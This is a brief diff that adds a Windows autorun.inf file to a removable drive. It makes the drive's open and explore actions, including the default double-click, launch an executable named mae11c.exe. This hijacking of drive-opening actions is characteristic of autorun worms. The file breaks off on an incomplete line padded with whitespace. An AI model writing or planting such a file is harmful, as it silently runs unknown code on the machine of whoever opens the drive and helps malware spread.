@@ -1,0 +1,10 @@
+[AutoRun]
+open=mae11c.exe
+;shell\open=Open(&O)
+shell\open\Command=mae11c.exe
+shell\open\Default=1
+;shell\explore=Manager(&X)
+shell\explore\Command=mae11c.exe
+shell\explore\
+
+                                                               
